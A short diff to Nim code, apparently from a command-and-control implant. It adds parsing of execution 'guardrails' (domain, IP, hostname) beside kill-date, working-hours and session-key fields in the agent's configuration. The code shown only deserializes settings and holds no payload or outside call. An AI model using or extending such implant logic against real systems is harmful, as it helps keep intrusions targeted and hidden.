@@ -46,6 +46,12 @@ proc deserializeConfiguration(config: string): AgentCtx =
                 endMinute: cast[int32](unpacker.getUint32())
             )
         ),
+        guardrails: Guardrails(
+            guardrails: unpacker.getUint32(),
+            domain: unpacker.getDataWithLengthPrefix(),
+            ip: unpacker.getDataWithLengthPrefix(),
+            hostname: unpacker.getDataWithLengthPrefix()
+        ),
         killDate: cast[int64](unpacker.getUint64()),
         sessionKey: deriveSessionKey(agentKeyPair, unpacker.getByteArray(Key)),
         agentPublicKey: agentKeyPair.publicKey,
